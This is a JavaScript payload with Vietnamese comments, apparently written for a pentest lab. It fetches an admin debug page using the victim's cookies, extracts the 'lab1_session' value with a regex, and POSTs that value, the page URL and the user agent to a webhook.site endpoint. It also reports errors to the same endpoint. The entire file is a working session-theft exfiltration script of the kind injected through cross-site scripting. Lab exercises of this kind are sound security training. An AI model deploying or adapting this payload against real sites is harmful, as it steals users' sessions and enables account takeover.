// Bước 1: Tạo một request đến trang admin debug
// Sử dụng fetch API để lấy nội dung trang
fetch('https://lab1.demo-pentest.pp.ua/admin/debug', {
    method: 'GET',
    credentials: 'include' // Rất quan trọng: Gửi kèm cookie (như lab1_session) của người dùng hiện tại
})
.then(response => {
    // Kiểm tra xem request có thành công không
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.text(); // Lấy nội dung trang dưới dạng text
})
.then(htmlContent => {
    // Bước 2: Tìm giá trị của 'lab1_session' trong nội dung trang
    // Có 2 cách phổ biến:
    
    // Cách A: Tìm kiếm đơn giản bằng biểu thức chính quy (Regex)
    // Giả sử session hiển thị dạng: "lab1_session: abcdef12345"
    const sessionRegex = /lab1_session[:\s]*([a-f0-9]+)/i;
    const match = htmlContent.match(sessionRegex);
    
    let sessionValue = null;
    if (match && match[1]) {
        sessionValue = match[1];
        console.log('Đã tìm thấy lab1_session:', sessionValue);
    } else {
        console.log('Không tìm thấy lab1_session trong nội dung.');
        // Cách B (phức tạp hơn): Parse DOM nếu session nằm trong một thẻ HTML cụ thể
        // Ví dụ: tạo một DOM ảo từ htmlContent và dùng querySelector
        // const parser = new DOMParser();
        // const doc = parser.parseFromString(htmlContent, 'text/html');
        // const element = doc.querySelector('#session-id-element');
        // if (element) sessionValue = element.textContent;
    }

    // Bước 3: Gửi giá trị tìm được đến server của bạn
    if (sessionValue) {
        const webhookUrl = 'https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c';
        
        // Tạo dữ liệu để gửi đi
        const dataToSend = {
            url: window.location.href, // Ghi lại trang hiện tại
            session: sessionValue,
            userAgent: navigator.userAgent
        };

        // Gửi dữ liệu dưới dạng JSON
        fetch(webhookUrl, {
            method: 'POST',
            mode: 'no-cors', // 'no-cors' giúp gửi request mà không cần quan tâm đến CORS, nhưng bạn sẽ không đọc được response từ webhook.
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataToSend)
        })
        .then(() => console.log('Đã gửi dữ liệu về webhook.'))
        .catch(error => console.error('Lỗi khi gửi về webhook:', error));
    }
})
.catch(error => {
    console.error('Lỗi khi fetch trang admin/debug:', error);
    // Có thể gửi báo lỗi về webhook để biết
    fetch('https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({error: error.toString()})
    });
});
